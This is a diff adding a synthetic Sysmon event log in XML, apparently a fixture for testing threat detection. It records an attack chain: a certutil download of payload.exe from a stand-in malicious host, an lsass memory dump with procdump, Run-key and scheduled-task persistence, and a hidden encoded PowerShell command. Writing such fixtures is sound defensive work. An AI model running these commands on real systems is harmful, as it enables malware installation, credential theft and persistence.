@@ -1,0 +1,136 @@
+<Events>
+  <!-- Normal process -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:00:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-0000-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- LoLBin Abuse: certutil -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:01:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-1111-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="CommandLine">certutil.exe -urlcache -split -f "http://malicious.com/payload.exe" C:\Temp\payload.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- Network Connection for certutil download -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>3</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:01:02.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-1111-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="DestinationIp">198.51.100.42</Data>
+      <Data Name="DestinationPort">80</Data>
+    </EventData>
+  </Event>
+
+  <!-- Execution of downloaded payload -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:02:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-2222-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Temp\payload.exe</Data>
+      <Data Name="CommandLine">payload.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- Credential Dumping: procdump -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:05:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-3333-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Temp\procdump.exe</Data>
+      <Data Name="CommandLine">procdump.exe -ma lsass.exe lsass.dmp</Data>
+      <Data Name="ParentImage">C:\Temp\payload.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- Persistence Run Key -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:10:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-4444-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+      <Data Name="CommandLine">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /t REG_SZ /d C:\Temp\payload.exe /f</Data>
+      <Data Name="ParentImage">C:\Temp\payload.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- Scheduled Task Creation -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:11:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-5555-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
+      <Data Name="CommandLine">schtasks /create /tn "Updater" /tr C:\Temp\payload.exe /sc onlogon</Data>
+      <Data Name="ParentImage">C:\Temp\payload.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+
+  <!-- Suspicious Powershell -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-DEV-101</Computer>
+      <SystemTime>2026-06-09T10:15:00.000Z</SystemTime>
+    </System>
+    <EventData>
+      <Data Name="ProcessGuid">{a1b2c3d4-6666-0000-0000-000000000000}</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA... </Data>
+      <Data Name="ParentImage">C:\Temp\payload.exe</Data>
+      <Data Name="User">DESKTOP-DEV-101\Alice</Data>
+    </EventData>
+  </Event>
+</Events>
